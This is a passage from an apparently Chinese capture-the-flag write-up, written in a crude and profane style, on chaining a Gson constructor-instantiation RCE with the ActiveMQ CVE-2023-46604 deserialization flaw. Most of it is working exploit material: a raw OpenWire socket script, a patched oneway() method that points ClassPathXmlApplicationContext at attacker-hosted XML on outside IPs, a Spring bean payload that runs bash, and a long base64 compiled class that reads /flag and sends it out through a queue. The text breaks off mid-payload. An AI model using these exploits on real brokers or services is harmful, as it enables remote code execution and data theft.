Json=&quot;eyJscGNBbGxDb20iOlsidG91Y2ggL3RtcC9hYWFhYSIsInRvdWNoIC90bXAvYWFhYWEiXX0=&quot;; String Person=&quot;Person&quot;; Gson gson = new Gson(); com.api.Person o = (Person) gson.fromJson(new String(Base64.getDecoder().decode(Json), StandardCharsets.UTF_8), Class.forName(Person)); &#125;&#125;// 随便给个 base64 来个 Person😤 123456789101112131415161718192021222324252627282930313233343536373839 public class Person &#123; public Person() &#123; System.out.println(1111); &#125; public String name = &quot;john&quot;; public String age = &quot;11&quot;; public String toString() &#123; return &quot;Person&#123;name=&#x27;&quot; + this.name + &quot;&#x27;, age=&#x27;&quot; + this.age + &quot;&#x27;&#125;&quot;; &#125; public Person(String name, String age) &#123; this.name = name; this.age = age; &#125; Object writeReplace() &#123; System.out.println(&#x27;1&#x27;); return 1; &#125; public String getName() &#123; return this.name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getAge() &#123; return this.age; &#125; public void setAge(String age) &#123; this.age = age; &#125;&#125; 可以看到有构造方法，就会去调用，没有的话，就会调用 Unsafe 实例化. 所以，思考一下怎么通过 construct 到 RCE.😤 这里就可以尝试用一个 PrintServiceLookupProvider , 事实上只要实现了 PrintServiceLookup 类的都行. 写个 demo 去调试一下🤣 1234567891011121314151617181920212223242526272829303132333435import java.io.IOException;public class Person &#123; public Person() throws IOException &#123; Runtime.getRuntime().exec(&quot;whoami&quot;+age); &#125; public String name = &quot;john&quot;; public String age = &quot;11&quot;; public String toString() &#123; return &quot;Person&#123;name=&#x27;&quot; + this.name + &quot;&#x27;, age=&#x27;&quot; + this.age + &quot;&#x27;&#125;&quot;; &#125; public Person(String name, String age) &#123; this.name = name; this.age = age; &#125; public String getName() &#123; return this.name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getAge() &#123; return this.age; &#125; public void setAge(String age) &#123; this.age = age; &#125;&#125; 尝试命令拼接 不出意外地出意外了😅😓 大 B 老师说，PrintService 是会新建一个线程，进行一个重复循环如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051import java.io.IOException;import java.io.Writer;public class Person &#123; class RceThread implements Runnable&#123; @Override public void run() &#123; while (true) &#123; try &#123; Runtime.getRuntime().exec(age); &#125; catch (IOException e) &#123; throw new RuntimeException(e); &#125; &#125; &#125; &#125; public Person() throws IOException &#123; Thread thr = new Thread(null, new Person.RceThread(), &quot;Rce&quot;, 0, false); thr.setDaemon(true); thr.start(); &#125; public String name = &quot;john&quot;; public String age = &quot;11&quot;; public String toString() &#123; return &quot;Person&#123;name=&#x27;&quot; + this.name + &quot;&#x27;, age=&#x27;&quot; + this.age + &quot;&#x27;&#125;&quot;; &#125; public Person(String name, String age) &#123; this.name = name; this.age = age; &#125; public String getName() &#123; return this.name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getAge() &#123; return this.age; &#125; public void setAge(String age) &#123; this.age = age; &#125;&#125; 访问 1http://127.0.0.1:8877/api/sun.print.PrintServiceLookupProvider/eyJscGNBbGxDb20iOlsidG91Y2ggL3RtcC9hYWFhYSIsInRvdWNoIC90bXAvYWFhYWEiXX0= rce 成功 md 本地 jdk 方法不太一样，调不出来，借用一下大 B 老师的图图. gtmdapachemq Apache ActiveMQ (版本 &lt; 5.18.3) RCE 分析 - X1r0z Blog (exp10it.cn) CVE-2023-46604 activemq&lt;5.18.3 RCE 分析 - KingBridge - 博客园 (cnblogs.com) 环境搭建 12345678FROM apache/activemq-classic:5.17.5RUN apt-get updateRUN apt-get install wget curl netcat -yEXPOSE 61616EXPOSE 5005CMD [ &quot;tail&quot;,&quot;-f&quot;,&quot;/dev/null&quot; ] 不多说了，5005 用于 debug 用， 找到 /opt/apache-activemq/bin/linux-x86-64/wrapper.conf 加上一句 1wrapper.java.additional.14=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 运行 1/opt/apache-activemq/bin/linux-x86-64/activemq console 👴先把 exp 放这，接着跟着👴分析这怎么个事 12345678910111213141516171819202122232425262728293031323334package org.example;import javax.xml.crypto.Data;import java.io.DataOutputStream;import java.io.IOException;import java.io.OutputStream;import java.net.Socket;public class ScratchExploit &#123; public static void main(String[] args) throws IOException &#123; Socket socket = new Socket(&quot;127.0.0.1&quot;, 61616); OutputStream os = socket.getOutputStream(); DataOutputStream dos = new DataOutputStream(os); dos.writeInt(0);// size dos.writeByte(31);// type dos.writeInt(0);// CommandId dos.writeBoolean(false);// Command response required dos.writeInt(0);// CorrelationId // body dos.writeBoolean(true); // UTF dos.writeBoolean(true); dos.writeUTF(&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;); dos.writeBoolean(true); dos.writeUTF(&quot;http://192.168.111.1:8888/evil.xml&quot;); dos.close(); os.close(); socket.close(); &#125;&#125; 1234567891011&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;&lt;![CDATA[touch /tmp/pwned]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt; 起个 python 的 http 服务，别跟👴说你不会哦. 流程分析 ここは断点😤 在这里会进行任意类的有参实例化，而 ApacheMQ 是基于 spring 的，所以自然会有 ClassPathXmlApplicationContext 这个类，我们让他进行实例化，即可完成 RCE，这个利用需要出网访问公网 ip 的恶意 xml。 分析如何利用到 createThrowable😊 Java Message Service(JMS) 👴也不是很懂是啥玩意，反正跟服务有关吗，简单抄一下概念放上😒🤣 Java Message Service（JMS）是一种用于创建、发送、接收和管理消息的 Java API，通常用于构建分布式应用程序。JMS 是 Java EE（Enterprise Edition）规范的一部分，它提供了一种标准的方法来实现异步通信，使不同组件、应用程序和系统能够可靠地交换消息。 概念: 消息（Message）：JMS 消息是一种用于在应用程序之间传递信息的数据包。消息可以包含文本、字节、Map、对象等不同类型的数据。 消息生产者（Message Producer）：消息生产者是负责创建和发送消息的应用程序组件。它将消息发送到消息队列或主题。 消息消费者（Message Consumer）：消息消费者是负责接收和处理消息的应用程序组件。它订阅一个消息队列或主题，以接收发送到该队列或主题的消息。 消息队列（Queue）：消息队列是一种点对点（Point-to-Point）通信模型，其中消息生产者将消息发送到特定队列，而消息消费者从队列接收消息。每条消息只能被一个消费者接收。 主题（Topic）：主题是一种发布 / 订阅（Publish/Subscribe）通信模型，其中消息生产者将消息发送到主题，而所有订阅了该主题的消息消费者都会接收该消息。 连接工厂（Connection Factory）：连接工厂是用于创建 JMS 连接的工厂对象。连接是与消息代理（如消息队列服务器）的连接，它负责管理会话和消息的传递。 会话（Session）：会话是一个上下文，用于发送和接收消息。它提供了事务性和非事务性会话选项，以确保消息的可靠传递。 消息代理（Message Broker）：消息代理是一个中间件组件，负责接收、存储和路由消息。常见的 JMS 消息代理包括 Apache ActiveMQ、RabbitMQ 和 IBM WebSphere MQ 等。 在 JMS 中，producer client 和 consumer client 异步地向 broker 建立连接。Queue 是可消耗性的，topic 是无限的。😅 12345678910111213141516171819202122232425package org.example;import org.apache.activemq.ActiveMQConnectionFactory;import javax.jms.*;/** * Hello world! * */public class App&#123; public static void main(String[] args) throws Exception &#123; ConnectionFactory connectionFactory = new ActiveMQConnectionFactory(&quot;tcp://localhost:61616&quot;); Connection connection = connectionFactory.createConnection(); connection.start(); Session session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE); Destination destination = session.createQueue(&quot;tempQueue&quot;); MessageProducer producer = session.createProducer(destination); Message message = session.createObjectMessage(&quot;123&quot;); producer.send(message); connection.close(); &#125;&#125; 首先创造连接，打本地的 616 端口服务，重点在 Destination destination = session.createQueue(&quot;tempQueue&quot;); ：创建一个消息队列。这里使用 createQueue() 方法创建了一个名为 &quot;tempQueue&quot; 的队列。这是一个点对点通信模型的队列。 一般来说 Producer 将消息放在队列之中，允许其他应用程序或组件从该队列接收消息. activemq 的 broker 和 client 用 OpenWire 应用层协议通信，传输层用的是 TCP 协议。 OpenWire 通信的包会在 org.apache.activemq.openwire#doUnmarshal 反序列化 OpenWire（也称为 ActiveMQ OpenWire）是 Apache ActiveMQ 消息代理的二进制协议，用于在消息代理和 JMS 客户端之间进行通信。它是一种紧凑的、高效的协议，旨在提供快速的消息传递性能。👴简单说到这，不想长篇大幅写了 (ఠൠఠ)ﾉ 上 tnd 断点 ![1699354951791](./assets/1699354951791.png 阿米诺斯，捏麻麻地报错 哦，源赖氏没有这个类，ntmd 不早说 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt; &lt;artifactId&gt;log4j-core&lt;/artifactId&gt; &lt;version&gt;2.17.1&lt;/version&gt; &lt;!-- 使用适当的版本 --&gt; &lt;/dependency&gt; maven 重新加载的时候又 tmd 把自己加的依赖去掉了，重新加一下. 运行后，走到断点处 根据 dataType 指定的 DataStreamMarshaller 实现类，调用 createObject 方法。然后根据 tightEncodingEnabled 选择 tightUnmarshal 或 looseUnmarshal 一次 ApacheMQ 的通讯请求中会不断的有 marshal 和 dounmarshal 的操作 而 ExceptionResponseMarshaller 有 tightUnmarhsal 方法，会进入其 tightUnmarhsal 方法，是 BaseDataStreamMarshaller 的子类 什么？你问什么是 BaseDataStreamMarshaller ? 不就是最终漏洞利用点的地方吗. ExceptionResponseMarshaller#looseUnmarshal 会调用 looseUnmarsalThrowable，从而调用 org.apache.activemq.openwire.v12.BaseDataStreamMarshaller#createThrowable 到达漏洞利用点. 捏麻麻地，好√Ⅷ 难调，nmd 一次还有时间限制 走到 looseUnmarsalThrowable 这里就进入了恶意方法，至此，我们需要控制 clazz 和 message 因为 ExceptionResponseMarshaller 也有 marshal 方法，所以就研究如何去发送一个经由这个 marshaller 处理的 ExceptionResponse oneway 方法会调用 wireFormat.marshal() 去序列化 command command 就是前面准备发送的 ObjectMessage , 而 wireFormat 就是和它对应的序列化器 那么我们只需要手动 patch 这个方法，将 command 改成 ExceptionResponse, 将 wireFormat 改成 ExceptionResponseMarshaller 即可 this.wireFormat.marshal(command, this.dataOut); 我们在这里手动 patch 其中 command 为 CPX 类，我们的做法很简单，也只需要写一个相同的包名，这样由于方法调用机制，会优先寻找我们重写的类，然后调用其中的 onway 方法。 1234567public void oneway(Object command) throws IOException &#123; this.checkStarted(); Throwable context = new ClassPathXmlApplicationContext(&quot;http://8.130.24.188:8000/rce.xml&quot;); ExceptionResponse exceptionResponse = new ExceptionResponse(context); this.wireFormat.marshal(exceptionResponse, this.dataOut); this.dataOut.flush();&#125; 123456789101112131415package org.springframework.context.support;public class ClassPathXmlApplicationContext extends Throwable&#123; private String message; public ClassPathXmlApplicationContext(String message) &#123; this.message = message; &#125; @Override public String getMessage() &#123; return message; &#125;&#125; 注意重写 getMedssage，这是为了让服务端获取到 message，也就是实例化参数）继承 Throwable 是因为 ExceptionResponse 需要 Exception 类型，我们只是需要他的类名和传参。然后服务端会根据这 2 个值进行实例化. 真√Ⅷ 恶心，太难调了，老是掉连接. 会进行本地序列化，直接改方法 算了，根据文档，打一个 sock 协议 ActiveMQ (apache.org)😅 打 tmd 题目😡 nmd 题目反代不让出网，完全利用不了.😅 肖健仁！！！😡, 题目既然还有一个挂 GSON 的机子，👴就打 tmd 的 SSRF😤 参考 NESE 爹的 exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import org.apache.activemq.ActiveMQConnectionFactory;import javax.jms.*;public class Main implements MessageListener &#123; private void publish() throws Exception &#123; javax.jms.ConnectionFactory factory; factory = new ActiveMQConnectionFactory(&quot;tcp://127.0.0.1:61616&quot;); Connection connection = factory.createConnection(); Session pubSession = connection.createSession(false, Session.AUTO_ACKNOWLEDGE); Queue queue = pubSession.createQueue(&quot;flagqueue&quot;); MessageProducer publisher = pubSession.createProducer(queue); String[] cmd = new String[]&#123;&quot;/bin/sh&quot;,&quot;-c&quot;,&quot;cat /flag&quot;&#125;; byte[] bs = new Scanner(new ProcessBuilder(cmd).start().getInputStream()) .useDelimiter(&quot;\\\\A&quot;) .next() .getBytes(); String message = new String(bs); TextMessage msg = pubSession.createTextMessage(); msg.setText(message); publisher.send(msg); System.out.println(&quot;publish finished&quot;); connection.close(); &#125; private void consume() throws Exception &#123; ConnectionFactory factory = new ActiveMQConnectionFactory(&quot;tcp://xxx:61616&quot;); Connection connection = factory.createConnection(); Session subSession = connection.createSession(false, Session.AUTO_ACKNOWLEDGE); Queue queue = subSession.createQueue(&quot;flagqueue&quot;); MessageConsumer subscriber = subSession.createConsumer(queue); subscriber.setMessageListener(this); connection.start(); &#125; public static void main(String[] args) throws Exception &#123; Main main = new Main(); main.publish(); &#125; @Override public void onMessage(Message message) &#123; try &#123; System.out.println(&quot;Received &quot; + ((TextMessage) message).getText()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 通过这个文件读 flag, 从文件 /flag 读取内容，并将其作为文本消息发送到名为 “flagqueue” 的 ActiveMQ 消息队列中。这使得其他应用程序可以订阅 “flagqueue” 队列来接收消息。 改一下 oneway, 通过这个去 SSRF 的 GSON 1234567public void oneway(Object command) throws IOException &#123; this.checkStarted(); Throwable obj = new ClassPathXmlApplicationContext(&quot;http://127.0.0.1:8877/api/sun.print.&quot;); ExceptionResponse response = new ExceptionResponse(obj); this.wireFormat.marshal(response, this.dataOut); this.dataOut.flush();&#125; 1echo 编译好的class的base64 &gt; /tmp/nmlgb.txt 1&#123;&quot;lpcAllCom&quot;:[&quot;cmd&quot;,&quot;cmd&quot;]&#125; 1yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgvam1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJQAvACkAMQA3AAAAIAADACUABABXAFgAAgAAACoAOAA5AAAAAAAqAEkAWQABAFoAAAAHAAJkBwAvBAABAFsAAAACAFw= 1&#123;&quot;lpcAllCom&quot;:[&quot;echo yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgvam1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAZamF2YXgvam1zL01lc3NhZ2VDb25zdW1lcgEAEnNldE1lc3NhZ2VMaXN0ZW5lcgEAHihMamF2YXgvam1zL01lc3NhZ2VMaXN0ZW5lcjspVgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAB2dldFRleHQBAAh0b1N0cmluZwEAD3ByaW50U3RhY2tUcmFjZQAhACUAMQABADIAAAAFAAEAMwA0AAEANQAAAC8AAQABAAAABSq3AAGxAAAAAgA2AAAABgABAAAABQA3AAAADAABAAAABQA4ADkAAAACADoANAACADUAAAFeAAUACgAAAJq7AAJZEgO3AARMK7kABQEATSwDBLkABwMATi0SCLkACQIAOgQtGQS5AAoCADoFBr0AC1kDEgxTWQQSDVNZBRIOUzoGuwAPWbsAEFkZBrcAEbYAErYAE7cAFBIVtgAWtgAXtgAYOge7AAtZGQe3ABk6CC25ABoBADoJGQkZCLkAGwIAGQUZCbkAHAIAsgAdEh62AB8suQAgAQCxAAAAAgA2AAAARgARAAAACAAKAAkAEQAKABoACwAkAAwALgANAEMADgBbAA8AXgAQAGEAEQBmABIAcQATAHkAFACCABUAiwAWAJMAFwCZABgANwAAAGYACgAAAJoAOAA5AAAACgCQADsAPAABABEAiQA9AD4AAgAaAIAAPwBAAAMAJAB2AEEAQgAEAC4AbABDAEQABQBDAFcARQBGAAYAZgA0AEcASAAHAHEAKQBJAEoACAB5ACEASwBMAAkATQAAAAQAAQAvAAIATgA0AAIANQAAALUAAwAGAAAAPbsAAlkSIbcABEwruQAFAQBNLAMEuQAHAwBOLRIIuQAJAgA6BC0ZBLkAIgIAOgUZBSq5ACMCACy5ACQBALEAAAACADYAAAAiAAgAAAAbAAoAHAARAB0AGgAeACQAHwAuACAANgAhADwAIgA3AAAAPgAGAAAAPQA4ADkAAAAKADMAOwA8AAEAEQAsAD0APgACABoAIwBPAEAAAwAkABkAQQBCAAQALgAPAFAAUQAFAE0AAAAEAAEALwAJAFIAUwACADUAAABJAAIAAgAAAA27ACVZtwAmTCu3ACexAAAAAgA2AAAADgADAAAAJgAIACcADAAoADcAAAAWAAIAAAANAFQARgAAAAgABQBSADkAAQBNAAAABAABAC8AAQBVAFYAAQA1AAAAjQADAAMAAAAqsgAduwAoWbcAKRIqtgArK8AALLkALQEAtgArtgAutgAfpwAITSy2ADCxAAEAAAAhACQALwADADYAAAAWAAUAAAAtACEAMAAkAC4AJ